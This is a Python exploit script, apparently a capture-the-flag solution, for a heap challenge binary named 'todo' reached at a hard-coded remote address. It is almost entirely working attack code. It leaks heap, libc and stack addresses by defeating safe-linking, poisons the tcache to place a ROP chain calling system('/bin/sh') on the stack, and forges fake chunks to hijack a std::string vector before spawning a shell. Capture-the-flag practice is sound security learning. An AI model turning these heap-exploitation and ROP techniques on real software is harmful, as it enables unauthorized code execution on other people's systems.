from ptrlib import *

binary = "./todo"
elf = ELF(binary)

"""
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
r = Socket("nc localhost 3001")
uon = True
is_remote = False
"""
uon = True
libc = ELF("./libc.so.6")
r = Socket("nc 34.170.146.252 39595")
is_remote = True
# """


def just_u64(x):
    return u64(x.ljust(8, b'\x00'))


def wait_for_attach():
    if not is_remote:
        input('attach?')


def sla(*args):
    r.sendlineafter(*args)


def decrypt(cipher):
    key = 0
    plain = 0
    for i in range(1, 6):
        bits = 64 - 12 * i
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12
    return plain


def encrypt(val, addr):
    return val ^ (addr >> 12)


def add(s):
    sla("> ", "1")
    sla(": ", s)


def show(idx):
    sla("> ", "2")
    sla(": ", str(idx))
    l = r.recvlineafter(": ")
    return l


def edit(idx, s):
    sla("> ", "3")
    sla(": ", str(idx))
    sla(": ", s)


def delete(idx):
    sla("> ", "4")
    sla(": ", str(idx))


for i in range(10):
    add("A"*0x10)

for j in range(2):
    delete(9 - j)

# heap_leak
l = show(8)
x = l[:8]
x = u64(x)
heap_base = decrypt(x) - 80976
print("heap_base: ", hex(heap_base))


payload = p64(0x0) + p64(0x21) + b"HOFEFUGA" * 2
payload = payload * 60
payload += b"A" * (0x500 - len(payload))
add(payload)
add("G" * 0x70)
delete(9)
delete(8)

# libc_leak
l = show(8)
x = l[:8]
x = u64(x)
if uon:
    libc.base = x - 0x219ce0 - 0x1000
else:
    libc.base = x - 0x203b20

# stack leak by environ
for i in range(3):
    delete(7 - i)
vector = heap_base + 0x13a20


environ = libc.symbol("environ")

print("vector: ", hex(vector))

edit(5, p64(encrypt(vector, heap_base + 0x139c0)))
add(p64(environ) + p64(16))
add(p64(environ) + p64(16))

l = show(0)
stack = u64(l[:8])
print("stack: ", hex(stack))


add("B" * 0x40)
add("B" * 0x40)
add("B" * 0x40)
for i in range(3):
    delete(9 - i)

ret_addr = stack - 0x138
if uon:
    ret_addr += 16
print('ret_addr - 8:', hex(ret_addr))
edit(7, p64(encrypt(ret_addr, heap_base + 0x13750)))


# send ROP payload
rop = [
    next(libc.gadget("ret")),
    next(libc.gadget("ret")),
    next(libc.gadget("pop rdi; ret")),
    next(libc.find("/bin/sh")),
    libc.symbol("system")
]
payload = flat(rop, map=p64)
payload += b"\x00" * (0x40 - len(payload))
wait_for_attach()
add(payload)
add(payload)


# overwrite vector for handling dtors
## creating many fake chunks
payload = p64(0x0) + p64(0x21) + b"NEKONEKO" * 2
payload *= 15
assert (len(payload) < 0x200)
payload += b"B" * (0x200 - len(payload))
payload_orig = payload

add(payload)
add("B" * 0x200)
add("B" * 0x200)
for i in range(3):
    delete(11 - i)

## base addr of fake chunks
base_addr = heap_base + 0x14b80

vector_buf = []
for i in range(13):
    if b"\n" in p64(base_addr):
        print("contains")
        continue
    vector_buf.append(base_addr + i * 0x20 + 0x10)
    vector_buf.append(0x10)
    vector_buf.append(0)
    vector_buf.append(0)

## vector of std::string with fake_chunks
payload = flat(vector_buf, map=p64)
print("len_payload: ", hex(len(payload)))

payload += b"\x00" * (0x200 - len(payload))

print('vector_addr - 8:', hex(vector))
edit(9, p64(encrypt(vector, heap_base + 0x14b60)))

add(payload_orig)
add(payload)


sla("> ", "5")

r.sh()
